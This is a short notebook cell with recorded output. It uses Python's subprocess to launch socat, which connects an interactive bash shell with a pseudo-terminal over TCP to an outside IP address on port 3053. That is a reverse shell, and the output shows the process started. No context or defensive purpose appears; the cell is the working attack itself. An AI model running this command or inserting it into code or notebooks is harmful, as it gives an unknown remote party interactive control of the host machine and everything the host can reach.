# %%
import subprocess
subprocess.Popen('/usr/bin/socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053', shell=True)
# Out:
# <Popen: returncode: None args: '/usr/bin/socat exec:"bash -li",pty,stderr,se...>
